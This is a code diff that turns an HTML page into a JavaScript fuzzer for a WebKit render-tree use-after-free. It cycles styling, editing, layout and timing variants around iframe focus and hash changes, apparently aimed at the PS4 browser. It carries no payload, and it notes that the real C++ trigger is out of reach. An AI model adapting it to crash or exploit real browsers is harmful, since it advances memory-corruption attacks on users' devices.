@@ -1,123 +1,293 @@
 
 <!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
+<!--
+  Fuzzer para render-tree-as-text-uaf (commit 3f3fec2)
+  Estratégia: cobrir variações de tudo que é fuzzável em JS,
+  iterando combinações de condições. O trigger C++ permanece
+  como gargalo — logado explicitamente quando tentado.
+-->
 <style>
-  iframe {
-    content: url();
-    zoom: 0.01;
-    width: 10px;
-    height: 10px;
-  }
+  #i0 { content: url(); zoom: 0.01; }
 </style>
-</head>
 <body>
-
-<div id="x" contenteditable="true">X</div>
-<div id="y" contenteditable="true">Y</div>
-<iframe id="i0"></iframe>
-<div id="log" style="font-family: monospace;"></div>
+<div id="log" style="font:12px monospace;white-space:pre;overflow:auto;height:300px;border:1px solid #ccc"></div>
+<iframe id="i0" tabindex="0"></iframe>
 
 <script>
-let iteration = 0;
-const MAX_ITERATIONS = 500;
+const log = (msg) => {
+  const el = document.getElementById('log');
+  el.textContent += `[${Date.now()}] ${msg}\n`;
+  el.scrollTop = el.scrollHeight;
+  console.log(msg);
+};
 
-function log(msg) {
-  document.getElementById('log').textContent = msg;
-}
-
-// Estratégias de mutação que serão testadas no loop
-const mutators = [
-  // 1. Alternância de hash rápida com foco
-  (frame) => {
-    location.hash = 'x';
-    frame.focus();
-    location.hash = 'y';
+// ─── Variantes para internals.settings.setAsyncFrameScrollingEnabled ───────
+const asyncScrollVariants = [
+  {
+    label: 'overflow:scroll (compositor layer)',
+    apply: (iframe) => { iframe.style.overflow = 'scroll'; }
   },
-  // 2. Manipulação de Seleção / Range (Caret) durante a troca de hash
-  (frame) => {
-    location.hash = 'x';
-    const sel = window.getSelection();
-    const target = document.getElementById(iteration % 2 === 0 ? 'x' : 'y');
-    if (target) {
-      const range = document.createRange();
-      range.selectNodeContents(target);
-      sel.removeAllRanges();
-      sel.addRange(range);
-    }
-    frame.focus();
-    location.hash = 'y';
+  {
+    label: 'willChange:transform (GPU layer)',
+    apply: (iframe) => { iframe.style.willChange = 'transform'; }
   },
-  // 3. Forçar Layout Thrashing no meio da mudança de estado
-  (frame) => {
-    location.hash = 'x';
-    void frame.offsetHeight;
-    void document.documentElement.offsetHeight;
-    frame.focus();
-    location.hash = 'y';
+  {
+    label: 'contain:strict (isolation layer)',
+    apply: (iframe) => { iframe.style.contain = 'strict'; }
   },
-  // 4. Mutação dinâmica do estilo zoom e content
-  (frame) => {
-    frame.style.zoom = (iteration % 2 === 0) ? '0.01' : '1.0';
-    frame.focus();
-    location.hash = (iteration % 2 === 0) ? 'x' : 'y';
+  {
+    label: 'translateZ(0) (force compositing)',
+    apply: (iframe) => { iframe.style.transform = 'translateZ(0)'; }
   },
-  // 5. Inserção/Remoção repetida de framesets na raiz
-  (frame) => {
-    const fs = document.createElement('frameset');
-    document.documentElement.append(fs);
-    frame.focus();
-    location.hash = 'y';
-    setTimeout(() => fs.remove(), 0);
-  }
+  {
+    label: 'nenhum (baseline sem async scroll)',
+    apply: (_) => {}
+  },
 ];
 
-function runFuzzStep() {
-  if (iteration >= MAX_ITERATIONS) {
-    log(`[+] Concluído ${MAX_ITERATIONS} iterações sem crash.`);
-    return;
-  }
+// ─── Variantes para internals.settings.setCaretBrowsingEnabled ────────────
+const caretVariants = [
+  {
+    label: 'designMode on (document)',
+    apply: () => { try { document.designMode = 'on'; } catch(e) {} }
+  },
+  {
+    label: 'contenteditable no body',
+    apply: () => { document.body.contentEditable = 'true'; }
+  },
+  {
+    label: 'nenhum (sem caret browsing)',
+    apply: () => {}
+  },
+];
 
-  iteration++;
-  log(`[+] Executando iteração: ${iteration}`);
+// ─── Variantes de trigger (substitutos para testRunner.dumpAsText) ─────────
+// Nenhum percorre externalRepresentation() — logamos isso explicitamente.
+// O objetivo é encontrar se algum aciona path alternativo de UAF.
+const triggerVariants = [
+  {
+    label: 'offsetWidth sync layout (document root)',
+    trigger: () => void document.documentElement.offsetWidth
+  },
+  {
+    label: 'getBoundingClientRect (iframe)',
+    trigger: () => void document.getElementById('i0').getBoundingClientRect()
+  },
+  {
+    label: 'getComputedStyle zoom',
+    trigger: () => void window.getComputedStyle(document.getElementById('i0')).zoom
+  },
+  {
+    label: 'Range.selectNodeContents (força render tree para selection)',
+    trigger: () => {
+      try {
+        const r = document.createRange();
+        r.selectNodeContents(document.getElementById('i0'));
+        window.getSelection().addRange(r);
+      } catch(e) {}
+    }
+  },
+  {
+    label: 'scrollIntoView (força layout do frame)',
+    trigger: () => {
+      try { document.getElementById('i0').scrollIntoView(); } catch(e) {}
+    }
+  },
+  {
+    label: 'elementFromPoint (hit-test no RenderWidget)',
+    trigger: () => {
+      const r = document.getElementById('i0').getBoundingClientRect();
+      document.elementFromPoint(r.left + 1, r.top + 1);
+    }
+  },
+  {
+    label: 'IntersectionObserver flush',
+    trigger: () => {
+      return new Promise(resolve => {
+        const io = new IntersectionObserver((entries) => {
+          io.disconnect();
+          resolve();
+        });
+        io.observe(document.getElementById('i0'));
+      });
+    }
+  },
+  {
+    label: 'requestAnimationFrame (layout pós-compositing)',
+    trigger: () => new Promise(resolve => requestAnimationFrame(resolve))
+  },
+  {
+    label: 'AVISO: testRunner.dumpAsText() — só funciona no CI',
+    trigger: () => {
+      if (window.testRunner) {
+        log('  → testRunner disponível! Acionando dumpAsText()...');
+        testRunner.dumpAsText();
+      } else {
+        log('  → testRunner ausente (esperado em produção/PS4)');
+      }
+    }
+  },
+  {
+    label: 'AVISO: internals.externalRepresentation() — só em test builds',
+    trigger: () => {
+      if (window.internals) {
+        try {
+          log('  → internals disponível! Acionando externalRepresentation()...');
+          internals.externalRepresentation(document.documentElement);
+        } catch(e) {
+          log(`  → internals presente mas erro: ${e.message}`);
+        }
+      } else {
+        log('  → internals ausente (esperado em produção/PS4)');
+      }
+    }
+  },
+];
 
-  let frame = document.getElementById('i0');
-  if (!frame) {
-    frame = document.createElement('iframe');
-    frame.id = 'i0';
-    document.body.appendChild(frame);
-  }
+// ─── Sequência de timing para o focus/hash ───────────────────────────────
+const timingVariants = [
+  {
+    label: 'Promise.resolve (microtask)',
+    schedule: (fn) => Promise.resolve().then(fn)
+  },
+  {
+    label: 'setTimeout(0) (macrotask)',
+    schedule: (fn) => setTimeout(fn, 0)
+  },
+  {
+    label: 'requestAnimationFrame',
+    schedule: (fn) => requestAnimationFrame(fn)
+  },
+  {
+    label: 'duplo Promise.resolve (microtask +1)',
+    schedule: (fn) => Promise.resolve().then(() => Promise.resolve().then(fn))
+  },
+];
 
-  // Configura o listener original de foco
-  frame.onfocus = () => {
-    location.hash = 'y';
-  };
+// ─── Engine do fuzzer ────────────────────────────────────────────────────
+const DELAY_BETWEEN_ITERATIONS = 300; // ms
+let iteration = 0;
+let errors = 0;
 
-  // Escolhe uma estratégia de mutação
-  const mutator = mutators[iteration % mutators.length];
-  mutator(frame);
+function resetDOM() {
+  // Remove frameset e recria iframe limpo para próxima iteração
+  const old = document.querySelector('frameset');
+  if (old) old.remove();
 
-  // Varia o método de disparo assíncrono (Microtask vs Macrotask vs Cache API)
-  if (window.caches && (iteration % 3 === 0)) {
-    caches.has('a').then(() => {
-      runFuzzStep();
-    });
-  } else if (iteration % 3 === 1) {
-    Promise.resolve().then(() => {
-      runFuzzStep();
-    });
-  } else {
-    setTimeout(runFuzzStep, 0);
-  }
+  const oldIframe = document.getElementById('i0');
+  const newIframe = document.createElement('iframe');
+  newIframe.id = 'i0';
+  newIframe.tabIndex = 0;
+  newIframe.style.cssText = 'content:url();zoom:0.01;';
+  oldIframe.replaceWith(newIframe);
+
+  // Reset hash sem trigger de evento
+  history.replaceState(null, '', window.location.pathname);
+
+  // Reset designMode/contentEditable
+  try { document.designMode = 'off'; } catch(e) {}
+  document.body.contentEditable = 'false';
 }
 
-window.addEventListener('load', () => {
-  // Injeta o frameset inicial conforme o original
-  document.documentElement.append(document.createElement('frameset'));
-  runFuzzStep();
-});
-</script>
+async function runIteration(asyncScroll, caret, trigger, timing) {
+  const label = `[iter ${iteration}] async=${asyncScroll.label} | caret=${caret.label} | trigger=${trigger.label} | timing=${timing.label}`;
+  log(`\n▶ ${label}`);
 
+  resetDOM();
+  const iframe = document.getElementById('i0');
+
+  // Aplica variantes de settings
+  asyncScroll.apply(iframe);
+  caret.apply();
+
+  return new Promise((resolve) => {
+    window.onload = null; // já estamos no onload, não re-registrar
+
+    document.documentElement.append(document.createElement('frameset'));
+
+    iframe.onfocus = () => {
+      log('  → onfocus disparado');
+      try {
+        // Aqui: trigger acontece no momento de focus + hash change
+        // para maximizar chance de race com layout
+        const result = trigger.trigger();
+        if (result && typeof result.then === 'function') {
+          result.then(() => {
+            location.hash = 'y';
+          });
+        } else {
+          location.hash = 'y';
+        }
+      } catch(e) {
+        log(`  ⚠ EXCEÇÃO em onfocus trigger: ${e.message}`);
+        errors++;
+      }
+    };
+
+    location.hash = 'x';
+
+    timing.schedule(async () => {
+      try {
+        // Trigger também antes do focus (replica dumpAsText pre-focus)
+        const pre = trigger.trigger();
+        if (pre && typeof pre.then === 'function') await pre;
+
+        iframe.focus();
+
+        // Trigger novamente pós-focus (replica dumpAsText pós-hash)
+        await new Promise(r => setTimeout(r, 50));
+        const post = trigger.trigger();
+        if (post && typeof post.then === 'function') await post;
+
+        log(`  ✓ iteração completa`);
+      } catch(e) {
+        log(`  ⚠ EXCEÇÃO em timing schedule: ${e.message}`);
+        errors++;
+      } finally {
+        resolve();
+      }
+    });
+  });
+}
+
+async function fuzz() {
+  const totalCombinacoes =
+    asyncScrollVariants.length *
+    caretVariants.length *
+    triggerVariants.length *
+    timingVariants.length;
+
+  log(`Iniciando fuzzer: ${totalCombinacoes} combinações`);
+  log(`AVISO: o trigger C++ (externalRepresentation) não é alcançável via JS puro.`);
+  log(`Qualquer exceção inesperada pode indicar instabilidade adjacente ao bug.\n`);
+
+  for (const asyncScroll of asyncScrollVariants) {
+    for (const caret of caretVariants) {
+      for (const trigger of triggerVariants) {
+        for (const timing of timingVariants) {
+          iteration++;
+          try {
+            await runIteration(asyncScroll, caret, trigger, timing);
+          } catch(e) {
+            log(`  ✖ ERRO NÃO CAPTURADO iter ${iteration}: ${e.message}`);
+            errors++;
+          }
+          await new Promise(r => setTimeout(r, DELAY_BETWEEN_ITERATIONS));
+        }
+      }
+    }
+  }
+
+  log(`\n═══ Fuzzer concluído ═══`);
+  log(`Total iterações: ${iteration}`);
+  log(`Exceções detectadas: ${errors}`);
+  log(`\nPróximos passos:`);
+  log(`  - Se errors > 0: inspecionar iterações com ⚠`);
+  log(`  - Trigger C++ real: conectar Remote Inspector durante as iterações`);
+  log(`    e acionar GetRenderTreeExternalRepresentation via protocolo WebKit`);
+}
+
+// Inicia após onload
+window.addEventListener('load', () => setTimeout(fuzz, 100));
+</script>
 </body>
-</html>
